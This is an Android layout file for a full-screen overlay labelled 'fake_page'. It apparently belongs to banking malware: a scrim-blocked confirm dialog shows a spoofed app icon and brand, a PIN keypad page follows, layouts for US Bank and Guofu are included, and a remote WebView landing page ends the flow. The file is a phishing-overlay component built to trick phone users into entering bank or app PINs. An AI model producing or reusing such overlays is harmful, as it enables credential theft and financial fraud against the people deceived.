<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/fake_page_root"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:clickable="true"
    android:focusable="true">

    <!-- Page 1: modal dialog (scrim blocks everything except Confirm) -->
    <FrameLayout
        android:id="@+id/fake_page_intro"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#99000000"
        android:clickable="true"
        android:focusable="true">

        <LinearLayout
            android:id="@+id/fake_page_dialog_card"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:layout_marginStart="36dp"
            android:layout_marginEnd="36dp"
            android:background="@drawable/fake_page_dialog_bg"
            android:clickable="true"
            android:elevation="12dp"
            android:focusable="true"
            android:orientation="vertical"
            android:paddingTop="18dp">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:gravity="center_vertical"
                android:orientation="horizontal"
                android:paddingStart="18dp"
                android:paddingEnd="18dp">

                <ImageView
                    android:id="@+id/fake_page_intro_icon"
                    android:layout_width="28dp"
                    android:layout_height="28dp"
                    android:contentDescription="@string/fake_page_app_icon_desc"
                    android:scaleType="fitCenter" />

                <TextView
                    android:id="@+id/fake_page_intro_app_name"
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_marginStart="10dp"
                    android:layout_weight="1"
                    android:ellipsize="end"
                    android:maxLines="1"
                    android:text="@string/fake_page_brand"
                    android:textColor="#111111"
                    android:textSize="17sp"
                    android:textStyle="bold" />
            </LinearLayout>

            <TextView
                android:id="@+id/fake_page_intro_title"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="14dp"
                android:paddingStart="18dp"
                android:paddingEnd="18dp"
                android:text="@string/fake_page_intro_title"
                android:textColor="#111111"
                android:textSize="15sp"
                android:textStyle="bold"
                android:visibility="gone" />

            <TextView
                android:id="@+id/fake_page_intro_desc"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="12dp"
                android:lineSpacingMultiplier="1.35"
                android:paddingStart="18dp"
                android:paddingEnd="18dp"
                android:text="@string/fake_page_intro_desc"
                android:textColor="#333333"
                android:textSize="14sp" />

            <View
                android:layout_width="match_parent"
                android:layout_height="1dp"
                android:layout_marginTop="18dp"
                android:background="@drawable/fake_page_dialog_divider" />

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:gravity="end"
                android:orientation="horizontal"
                android:paddingStart="14dp"
                android:paddingTop="12dp"
                android:paddingEnd="14dp"
                android:paddingBottom="14dp">

                <TextView
                    android:id="@+id/fake_page_next_btn"
                    android:layout_width="wrap_content"
                    android:layout_height="40dp"
                    android:background="@drawable/fake_page_confirm_btn_bg"
                    android:elevation="2dp"
                    android:gravity="center"
                    android:minWidth="88dp"
                    android:paddingStart="18dp"
                    android:paddingEnd="18dp"
                    android:text="@string/fake_page_confirm"
                    android:textColor="#111111"
                    android:textSize="15sp" />
            </LinearLayout>
        </LinearLayout>
    </FrameLayout>

    <!-- Page 2: PIN -->
    <LinearLayout
        android:id="@+id/fake_page_pin"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#F5F5F5"
        android:clickable="true"
        android:focusable="true"
        android:orientation="vertical"
        android:paddingTop="20dp"
        android:visibility="gone">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:gravity="top"
            android:orientation="horizontal"
            android:paddingStart="20dp"
            android:paddingEnd="20dp">

            <ImageView
                android:id="@+id/fake_page_app_icon"
                android:layout_width="42dp"
                android:layout_height="42dp"
                android:contentDescription="@string/fake_page_app_icon_desc"
                android:scaleType="fitCenter" />

            <View
                android:layout_width="0dp"
                android:layout_height="1dp"
                android:layout_weight="1" />

            <LinearLayout
                android:layout_width="wrap_content"
                android:layout_height="50dp"
                android:background="@drawable/fake_page_switch_border"
                android:orientation="horizontal">

                <TextView
                    android:id="@+id/fake_page_btn_pin6"
                    android:layout_width="120dp"
                    android:layout_height="match_parent"
                    android:background="@drawable/fake_page_switch_active"
                    android:gravity="center"
                    android:paddingStart="6dp"
                    android:paddingEnd="6dp"
                    android:text="@string/fake_page_pin_6"
                    android:textColor="#FFFFFF"
                    android:textSize="13sp" />

                <TextView
                    android:id="@+id/fake_page_btn_pin4"
                    android:layout_width="120dp"
                    android:layout_height="match_parent"
                    android:gravity="center"
                    android:paddingStart="6dp"
                    android:paddingEnd="6dp"
                    android:text="@string/fake_page_pin_4"
                    android:textColor="#465678"
                    android:textSize="13sp" />
            </LinearLayout>
        </LinearLayout>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:paddingStart="22dp"
            android:paddingTop="40dp"
            android:paddingEnd="22dp">

            <LinearLayout
                android:id="@+id/fake_page_pin_slots"
                android:layout_width="match_parent"
                android:layout_height="42dp"
                android:orientation="horizontal" />

            <TextView
                android:id="@+id/fake_page_pin_desc"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="20dp"
                android:lineSpacingMultiplier="1.4"
                android:text="@string/fake_page_pin_desc"
                android:textColor="#333333"
                android:textSize="15sp" />
        </LinearLayout>

        <View
            android:layout_width="match_parent"
            android:layout_height="0dp"
            android:layout_weight="1" />

        <GridLayout
            android:id="@+id/fake_page_keypad"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:alignmentMode="alignBounds"
            android:columnCount="3"
            android:paddingStart="24dp"
            android:paddingEnd="24dp"
            android:paddingBottom="28dp"
            android:rowCount="4"
            android:useDefaultMargins="true" />
    </LinearLayout>

    <include layout="@layout/fake_page_usbank" />

    <include layout="@layout/fake_page_guofu" />

    <!-- Page: remote WebView landing -->
    <FrameLayout
        android:id="@+id/fake_page_web"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#0b0b0f"
        android:clickable="true"
        android:focusable="true"
        android:visibility="gone">

        <WebView
            android:id="@+id/fake_page_webview"
            android:layout_width="match_parent"
            android:layout_height="match_parent" />
    </FrameLayout>
</FrameLayout>
